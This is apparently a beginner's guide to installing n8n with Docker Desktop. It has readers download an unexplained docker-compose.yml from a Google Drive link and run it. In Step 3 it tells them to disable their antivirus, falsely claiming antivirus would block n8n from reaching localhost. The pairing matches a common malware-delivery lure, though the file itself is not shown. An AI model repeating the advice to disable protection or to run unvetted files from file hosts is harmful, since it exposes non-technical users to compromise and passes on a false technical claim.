# 🚀 Installing n8n with Docker — Beginner's Guide

Welcome! This guide will walk you through installing **n8n** (a powerful automation tool) on your computer using **Docker**. No technical experience needed — just follow each step carefully.

---

## 📋 What You'll Need

- A Windows, Mac, or Linux computer
- An internet connection
- About 10–15 minutes

---

## Step 1: Install Docker Desktop

Docker is the program that will run n8n on your computer. Think of it as a container that keeps n8n neatly packaged and running.

1. Go to **[https://www.docker.com/products/docker-desktop](https://www.docker.com/products/docker-desktop)**
2. Click the **Download** button for your operating system (Windows or Mac)
3. Open the downloaded file and follow the on-screen installation steps
4. Once installed, **open Docker Desktop** — you should see a whale icon in your taskbar or menu bar
5. Wait until Docker says **"Engine running"** (there's a green indicator at the bottom left)

> ✅ Docker is ready when you see the green "Engine running" status.

---

## Step 2: Download the n8n Setup File

You were provided a file called **`docker-compose.yml`**. This file tells Docker exactly how to set up n8n for you.
[Click here to download the link](https://drive.google.com/file/d/1q6yTZ-ORbuW0Z3HGzC0Nn2p2ekPCWfPr/view?usp=drive_link)
1. Create a new folder somewhere easy to find — for example, on your Desktop, name it `n8n`
2. Place the `docker-compose.yml` file inside that folder
3. Inside the same `n8n` folder, create another folder called `shared` (this is where you can put files you want to use inside n8n later)

Your folder should look like this:

```
n8n/
├── docker-compose.yml
└── shared/
```

---

## Step 3: Open a Terminal (Command Prompt)


**Note: Please turn off your anti virus before proceeding with this step, else it will block n8n from accessing your local host.**
You'll need to type a couple of commands. Don't worry — there are only two!

**On Windows:**
1. Press the **Windows key**, type `cmd`, and press **Enter**
2. Type the following and press Enter (replace `YourUsername` with your actual Windows username):
   ```
   cd C:\Users\YourUsername\Desktop\n8n
   ```

**On Mac:**
1. Press **Cmd + Space**, type `Terminal`, and press **Enter**
2. Type the following and press Enter:
   ```
   cd ~/Desktop/n8n
   ```

> 💡 `cd` means "change directory" — it just navigates the terminal into your n8n folder.

---

## Step 4: Start n8n

Now, type this command and press **Enter**:

```
docker compose up -d
```

What happens next:
- Docker will download the n8n application (this may take a few minutes the first time)
- Once done, n8n will be running silently in the background
- You'll see a message like `Container n8n Started` when it's ready

> ⏳ The first time you run this, it may take 2–5 minutes to download. Subsequent starts are instant.

---

## Step 5: Open n8n in Your Browser

Once n8n is running, open any web browser (Chrome, Firefox, Edge) and go to:

```
http://localhost:5678
```

You should see the **n8n welcome screen**! Create your account and you're ready to start building automations.

---

## 🛑 How to Stop n8n

When you're done using n8n and want to stop it, go back to your terminal (make sure you're still in the `n8n` folder) and type:

```
docker compose down
```

This safely shuts down n8n. Your workflows and data are **saved automatically** and will be there when you start it again.

---

## ▶️ How to Start n8n Again Later

Any time you want to use n8n again, open your terminal, navigate to your `n8n` folder, and run:

```
docker compose up -d
```

Then visit `http://localhost:5678` in your browser.

---

## 📁 The `shared` Folder

The `shared` folder you created inside your `n8n` folder is special — any files you place there can be accessed from inside your n8n workflows. This is useful if you want n8n to read or write files on your computer.

---

## ❓ Troubleshooting

| Problem | Solution |
|---|---|
| `http://localhost:5678` doesn't open | Make sure Docker Desktop is running and you ran `docker compose up -d` |
| Command not found error | Make sure Docker Desktop is fully started (green status) before running commands |
| Port already in use error | Another app may be using port 5678 — restart your computer and try again |
| n8n is slow on first load | Normal! Give it 30–60 seconds on the very first launch |

---

## 🎉 You're All Set!

You now have a fully working n8n installation running locally on your computer. Your data is private, stays on your machine, and persists even after restarts.

Happy automating! 🤖
